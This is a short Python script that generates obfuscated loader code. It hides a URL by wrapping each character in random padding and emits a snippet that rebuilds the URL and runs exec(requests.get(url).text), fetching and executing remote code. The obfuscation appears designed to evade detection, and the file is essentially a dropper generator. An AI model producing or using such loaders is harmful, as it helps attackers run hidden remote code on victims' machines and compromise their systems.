import string
import random
import requests
import json

def randstring(length):
  letters = string.digits + string.ascii_letters
  return ( ''.join(random.choice(letters) for i in range(length)) )


def hidden_url(url):
  _list = []
  for x in url:
    _list.append(randstring(7)+ x + randstring(9))
  to_decode="""uaphgwp=""
for x in _list:
  uaphgwp = uaphgwp+x[7]
exec(requests.get(uaphgwp).text)""".replace("_list", str(_list))
  return(to_decode)

def url_obfuscation1(url):
  return(hidden_url(url))
  
